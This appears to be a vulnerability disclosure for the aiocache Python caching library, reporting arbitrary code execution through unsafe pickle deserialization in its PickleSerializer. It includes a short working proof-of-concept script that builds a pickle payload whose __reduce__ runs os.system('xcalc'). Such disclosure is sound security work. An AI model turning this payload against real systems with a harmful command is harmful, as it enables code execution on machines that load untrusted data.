# Description
Asyncio cache manager for redis, memcached and memory, This library aims for simplicity over specialization.
* **Vulnerability description**
    untrusted loading of data by the pickle.load function leading to Arbitrary code execution.

# Proof of Concept
Run exploit.py
```
import os
import pickle
#os.system('pip3 install aiocache')
from aiocache.serializers import serializers
#payload formation
class ArbitraryCode:
    def __reduce__(self):
        cmd = ('xcalc')
        return os.system, (cmd,)
dumps = pickle.dumps(ArbitraryCode())
serializers.PickleSerializer.loads(dumps,dumps)
```
* `pip3 install aiocache`
* `python3 exploit.py`
